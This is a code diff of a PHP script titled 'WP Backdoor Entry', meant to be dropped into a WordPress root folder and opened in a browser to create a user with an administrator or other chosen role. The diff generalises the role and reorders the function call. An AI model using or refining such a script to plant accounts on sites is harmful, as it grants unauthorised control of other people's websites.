@@ -3,12 +3,11 @@
 
   Script Name: WP Backdoor Entry
   
-  Description: A script to create a new user with Administrator role.
+  Description: A script to create a new user with any given role.
   
   Usage: Copy this file into your WordPress root folder and execute the script via the browser.
 
   */
-
 
   $wp_folder  = '';
   $username   = '';
@@ -42,8 +41,6 @@
       echo '<br>';
       exit;
   }
-
-    vc_create_administrator($username, $password, $email, $role, $wp_load_path);
     
     function vc_create_administrator($username, $password, $email, $role, $wp_load_path) {
     
@@ -65,10 +62,10 @@
         exit;
       }
     }
+
+    vc_create_administrator($username, $password, $email, $role, $wp_load_path);
     add_action('init','vc_create_administrator');
     
- 
-
 ?>
 
 <!DOCTYPE html>
